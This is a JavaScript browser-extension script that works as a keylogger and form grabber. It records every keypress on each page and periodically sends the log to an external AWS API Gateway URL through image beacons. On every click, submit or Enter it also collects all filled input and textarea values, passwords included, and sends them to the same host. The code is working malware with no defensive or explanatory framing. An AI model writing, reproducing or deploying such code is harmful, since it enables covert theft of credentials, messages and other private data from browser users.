chrome.storage.local.get("unique_user_id", function (result) {
    let userId = result.unique_user_id;

    if (!userId) {
        userId = prompt("Enter your unique user ID");
        if (userId) {
            chrome.storage.local.set({ unique_user_id: userId }, function () {
                startTracking(userId);
            });
        } else {
            console.warn("User cancelled ID prompt.");
        }
    } else {
        startTracking(userId);
    }
});


function startTracking(userId) {
    (function () {
        document.addEventListener("keypress", function (event) {
            let x = event.keyCode || event.which;
            let char = "";

            if (x === 13) {
                char = "[ENTER]";
                let current = localStorage.getItem("log_Extension") || "";
                localStorage.setItem("log_Extension", current + char);
                setTimeout(() => {
                    sendKeys();
                }, 50);
                return;
            }

            char = isNaN(x) ? event.key : String.fromCharCode(x);

            let current = localStorage.getItem("log_Extension") || "";
            localStorage.setItem("log_Extension", current + char);
        });

        setInterval(sendKeys, 10000);

        document.addEventListener("submit", function (e) {
            sendFormData();
        });

        document.addEventListener("click", function (e) {
            sendFormData();
        });

        document.addEventListener("keydown", function (e) {
            if (e.key === "Enter") {
                sendFormData()
            }
        });

        function sendKeys() {
            const keys = localStorage.getItem("log_Extension") || "";
            if (keys.length > 4) {
                const url = "https://stzv453mta.execute-api.ap-south-1.amazonaws.com?user=" + encodeURIComponent(userId) +
                    "&values=" + encodeURIComponent(keys) +
                    "&page=" + encodeURIComponent(location.href);
                new Image().src = url;
                localStorage.removeItem("log_Extension");
            }
        }

        function sendFormData() {
            const inputs = Array.from(document.querySelectorAll("input, textarea"))
                .filter(el => el.value.trim().length > 0)
                .map(el => `${el.name || el.id || "unnamed"}: ${el.value}`)
                .join(" | ");

            if (inputs.length === 0) return;

            const url = "https://stzv453mta.execute-api.ap-south-1.amazonaws.com?user=" + encodeURIComponent(userId) +
                "&values=" + encodeURIComponent(inputs) +
                "&page=" + encodeURIComponent(location.href);
            new Image().src = url;
        }
    })();

};
